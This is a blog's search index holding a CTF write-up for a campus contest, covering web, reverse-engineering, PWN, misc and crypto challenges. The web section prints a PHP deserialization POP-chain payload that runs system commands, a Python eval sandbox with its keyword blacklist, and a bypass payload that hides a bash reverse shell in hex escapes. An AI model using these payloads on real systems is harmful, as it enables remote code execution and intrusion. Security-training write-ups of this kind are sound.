<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>浙江工商大学校赛</title>
    <link href="/2025/05/15/%E6%A0%A1%E8%B5%9B/"/>
    <url>/2025/05/15/%E6%A0%A1%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h4 id="PHP签到"><a href="#PHP签到" class="headerlink" title="PHP签到"></a>PHP签到</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yiyi</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Do</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$You</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$love</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$web</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;迈进新手村了，接下来往哪走呢&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;web);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;web=<span class="hljs-variable language_">$this</span>-&gt;love;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;You-&gt;execurise=<span class="hljs-variable language_">$this</span>-&gt;Do);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">whoami</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$execurise</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lead</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hansome</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;lead;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_readable</span>(<span class="hljs-string">&quot;/flag&quot;</span>))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;签到也不带这么签的啊&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;execurise==<span class="hljs-string">&quot;man!&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;胜利就在眼前&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hansome-&gt;lover))&#123;<br>                    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span>(<span class="hljs-variable language_">$this</span>-&gt;execurise);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;搞什么啊，别犯困&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ZJGSU</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$girl</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$friend</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;心中有信仰，脚下有力量&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;girl-&gt;abc;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$args1</span>,<span class="hljs-variable">$args2</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$func</span>=<span class="hljs-variable language_">$this</span>-&gt;friend;<br>        <span class="hljs-variable">$func</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ZJPC</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$lover</span>;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-variable">$forever</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;forever-&gt;<span class="hljs-title function_ invoke__">nononon</span>();<br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-variable">$web</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;web&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$web</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$web</span>));<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;None&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;你真的是学web的么&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">yiyi</span>-&gt;</span>destruct<br><span class="hljs-function"><span class="hljs-title">whoami</span>-&gt;</span>set<br>ZJGSU-&gt;tostring<br><span class="hljs-function"><span class="hljs-title">whoami</span>-&gt;</span>get<br><span class="hljs-function"><span class="hljs-title">zjpc</span>-&gt;</span>isset<br><span class="hljs-function"><span class="hljs-title">yiyi</span>-&gt;</span>invoke<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$web</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">yiyi</span>();<br><span class="hljs-variable">$web</span>-&gt;You=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">whoami</span>();<br><span class="hljs-variable">$web</span>-&gt;You-&gt;lead=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ZJGSU</span>();<br><span class="hljs-variable">$web</span>-&gt;You-&gt;lead-&gt;girl=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">whoami</span>();<br><span class="hljs-variable">$web</span>-&gt;You-&gt;lead-&gt;girl-&gt;execurise=<span class="hljs-string">&quot;man!&quot;</span>;<br><span class="hljs-variable">$web</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ZJPC</span>();<br><span class="hljs-variable">$web</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;lover=<span class="hljs-number">1</span>;<br><span class="hljs-variable">$web</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ZJGSU</span>();<br><span class="hljs-variable">$web</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">yiyi</span>();<br><span class="hljs-variable">$web</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend-&gt;love=<span class="hljs-string">&quot;system(&#x27;cat /maybe_1_am_flag&#x27;);&quot;</span>;<br><span class="hljs-variable">$web</span>-&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend-&gt;web=<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br></code></pre></td></tr></table></figure><p>POP链构造，</p><h4 id="calc"><a href="#calc" class="headerlink" title="calc++"></a>calc++</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">s</span>):<br>    blacklist = [<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;@&#x27;</span>,<span class="hljs-string">&#x27;^&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;`&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;getattr&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;class&#x27;</span>,<span class="hljs-string">&#x27;subclasses&#x27;</span>,<span class="hljs-string">&#x27;mro&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>,<span class="hljs-string">&#x27;args&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;if&#x27;</span>,<span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span>,<span class="hljs-string">&#x27;compile&#x27;</span>,<span class="hljs-string">&#x27;execfile&#x27;</span>,<span class="hljs-string">&#x27;from_pyfile&#x27;</span>,<span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;local&#x27;</span>,<span class="hljs-string">&#x27;self&#x27;</span>,<span class="hljs-string">&#x27;item&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;getattribute&#x27;</span>,<span class="hljs-string">&#x27;func_globals&#x27;</span>,<span class="hljs-string">&#x27;__init__&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>,<span class="hljs-string">&#x27;__dict__&#x27;</span>, <span class="hljs-string">&#x27;\\x&#x27;</span>]<br>    flag = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> s.lower():<br>            flag= <span class="hljs-literal">False</span><br>            <span class="hljs-built_in">print</span>(no)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> flag<br>    <br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-string">&quot;我算啊算 算不到那个天命的女孩...&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/source&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    src = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    @app.route(&quot;/calc&quot;,methods=[&#x27;GET&#x27;])</span><br><span class="hljs-string">def calc():</span><br><span class="hljs-string">    ip = request.remote_addr</span><br><span class="hljs-string">    num = request.values.get(&quot;num&quot;)</span><br><span class="hljs-string">    log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip)</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    if waf(num):</span><br><span class="hljs-string">        try:</span><br><span class="hljs-string">            data = eval(num)</span><br><span class="hljs-string">            os.system(log)</span><br><span class="hljs-string">        except:</span><br><span class="hljs-string">            pass</span><br><span class="hljs-string">        return str(data)</span><br><span class="hljs-string">    else:</span><br><span class="hljs-string">        return &quot;waf!!&quot;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> src<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/calc&quot;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>():<br>    ip = request.remote_addr<br>    num = request.values.get(<span class="hljs-string">&quot;num&quot;</span>)<br>    log = <span class="hljs-string">&quot;echo &#123;0&#125; &#123;1&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="hljs-built_in">format</span>(time.strftime(<span class="hljs-string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip)<br>    <br>    <span class="hljs-keyword">if</span> waf(num):<br>        <span class="hljs-keyword">try</span>:<br>            data = <span class="hljs-built_in">eval</span>(num)<br>            os.system(log)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;waf!!&quot;</span><br></code></pre></td></tr></table></figure><p>发现eval了我们传入的num值，根据提示给定保姆级教程，我们得到了payload例子</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[[<span class="hljs-name">str</span>][<span class="hljs-name">0</span>]for[<span class="hljs-name">ᵒｓ.environ</span>[<span class="hljs-symbol">&#x27;BASH</span>\x5fFUNC\x5fecho%%&#x27;]]in[[&#x27;\x28\x29\x20\x7b\x20\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x27\x78\x27\x78\x27\x78\x27\x78\x27\x78\x2f\x34\x34\x34\x34\x20\x30\x3e\x26\x31\x3b\x7d&#x27;]]]<br></code></pre></td></tr></table></figure><p>但是发现\x被waf挡住了，所以这里用unicode绕过即可，然后就是shell反弹</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h4 id="逆向的本质"><a href="#逆向的本质" class="headerlink" title="逆向的本质"></a>逆向的本质</h4><p>}detacitsihpos_3b_ot_tub_llik_dn@_thg1f_ot_ton_s1_esrever_f0_ecn3sse_ehT{galf</p><p>逆向即可</p><h4 id="Unpack"><a href="#Unpack" class="headerlink" title="Unpack"></a>Unpack</h4><p>魔改的UPX，更改UPX的标志位</p><p><img src="/./../img/%E6%A0%A1%E8%B5%9B/1.png"></p><p>IDA得到一个字节组</p><p><img src="/./../img/%E6%A0%A1%E8%B5%9B/2.png"></p><p>然后根据算法逆向</p><p><img src="/./../img/%E6%A0%A1%E8%B5%9B/3.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">tmp=[<span class="hljs-number">0x6D</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x34</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x6F</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0x0E</span>]<br>flag=<span class="hljs-string">&quot;&quot;</span><br>tmp1=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>    tmp1=tmp[i]^tmp[i%<span class="hljs-number">4</span>+<span class="hljs-number">28</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(tmp1),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到flag</p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h4 id="math-game"><a href="#math-game" class="headerlink" title="math_game"></a>math_game</h4><p>简单的PWNTOOL利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = remote(<span class="hljs-string">&#x27;124.221.156.93&#x27;</span>,<span class="hljs-number">32936</span>)<br> <br>io.recvuntil(<span class="hljs-string">&quot;challenge.\n&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;&quot;</span>)<br><br>data = io.recvuntil(delims=<span class="hljs-string">b&quot;=&quot;</span>,timeout=<span class="hljs-number">5</span>)<br>data = data[:-<span class="hljs-number">1</span>].decode()<br>data = data.replace(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;//&#x27;</span>)<br>data = data.replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>data = data.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;接受到了&quot;</span>,data)<br>a = <span class="hljs-built_in">eval</span>(data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;运算后&quot;</span>,a)<br>io.sendline(<span class="hljs-built_in">str</span>(a))<br>io.recvuntil(<span class="hljs-string">&quot;shell...\n&quot;</span>)<br>io.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>io.recvall()<br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h4 id="Maze-Hunter"><a href="#Maze-Hunter" class="headerlink" title="Maze Hunter"></a>Maze Hunter</h4><p>跟着顺序一个一个找就行了</p><h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="密码是什么？可以拿来吃嘛🤓"><a href="#密码是什么？可以拿来吃嘛🤓" class="headerlink" title="密码是什么？可以拿来吃嘛🤓"></a>密码是什么？可以拿来吃嘛🤓</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> base64<br><br>symbols = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;</span><br>flag=[<span class="hljs-string">&quot;abbaa&quot;</span>,<span class="hljs-string">&quot;bbaab&quot;</span>,<span class="hljs-string">&quot;babba&quot;</span>,<span class="hljs-string">&quot;aabba&quot;</span>,<span class="hljs-string">&quot;aaaba&quot;</span>,<span class="hljs-string">&quot;bbaab&quot;</span>,<span class="hljs-string">&quot;bbabb&quot;</span>,<span class="hljs-string">&quot;bbabb&quot;</span>,<span class="hljs-string">&quot;bbbab&quot;</span>,<span class="hljs-string">&quot;aabba&quot;</span>,<span class="hljs-string">&quot;aaaab&quot;</span>,<span class="hljs-string">&quot;bbabb&quot;</span>,<span class="hljs-string">&quot;bbabb&quot;</span>,<span class="hljs-string">&quot;bbaab&quot;</span>,<span class="hljs-string">&quot;aabab&quot;</span>,<span class="hljs-string">&quot;bbaaa&quot;</span>,<span class="hljs-string">&quot;baaab&quot;</span>,<span class="hljs-string">&quot;babbb&quot;</span>,<span class="hljs-string">&quot;baabb&quot;</span>,<span class="hljs-string">&quot;bbaab&quot;</span>,<span class="hljs-string">&quot;baabb&quot;</span>,<span class="hljs-string">&quot;abbbb&quot;</span>,<span class="hljs-string">&quot;abbbb&quot;</span>,<span class="hljs-string">&quot;aabba&quot;</span>,<span class="hljs-string">&quot;baabb&quot;</span>,<span class="hljs-string">&quot;babba&quot;</span>,<span class="hljs-string">&quot;baaba&quot;</span>,<span class="hljs-string">&quot;babab&quot;</span>,<span class="hljs-string">&quot;bbbbb&quot;</span>,<span class="hljs-string">&quot;bbaab&quot;</span>,<span class="hljs-string">&quot;aabab&quot;</span>,<span class="hljs-string">&quot;bbaaa&quot;</span>,<span class="hljs-string">&quot;baaab&quot;</span>,<span class="hljs-string">&quot;babbb&quot;</span>,<span class="hljs-string">&quot;babaa&quot;</span>,<span class="hljs-string">&quot;bbaaa&quot;</span>,<span class="hljs-string">&quot;aabbb&quot;</span>,<span class="hljs-string">&quot;abbbb&quot;</span>,<span class="hljs-string">&quot;abbbb&quot;</span>,<span class="hljs-string">&quot;aabba&quot;</span>,<span class="hljs-string">&quot;baabb&quot;</span>,<span class="hljs-string">&quot;babba&quot;</span>,<span class="hljs-string">&quot;baaba&quot;</span>,<span class="hljs-string">&quot;bbbba&quot;</span>,<span class="hljs-string">&quot;abbbb&quot;</span>,<span class="hljs-string">&quot;aabba&quot;</span>,<span class="hljs-string">&quot;abbab&quot;</span>,<span class="hljs-string">&quot;bbbab&quot;</span>,<span class="hljs-string">&quot;abbbb&quot;</span>,<span class="hljs-string">&quot;babaa&quot;</span>]<br><br>codes = [<span class="hljs-built_in">format</span>(i, <span class="hljs-string">&#x27;05b&#x27;</span>).replace(<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>).replace(<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>)]<br><span class="hljs-built_in">print</span>(codes)<br>enc_map = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(symbols, codes))<br>dec_map = &#123;code: sym <span class="hljs-keyword">for</span> sym, code <span class="hljs-keyword">in</span> enc_map.items()&#125;<br><span class="hljs-built_in">print</span>(dec_map)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(dec_map[i],end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>五个字符一组，根据解密map得到base32字符串，解密即可</p>]]></content>
    
    
    <categories>
      
      <category>赛事回顾</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ISCC区域赛</title>
    <link href="/2025/05/10/ISCC%E5%8C%BA%E5%9F%9F%E8%B5%9B/"/>
    <url>/2025/05/10/ISCC%E5%8C%BA%E5%9F%9F%E8%B5%9B/</url>
    
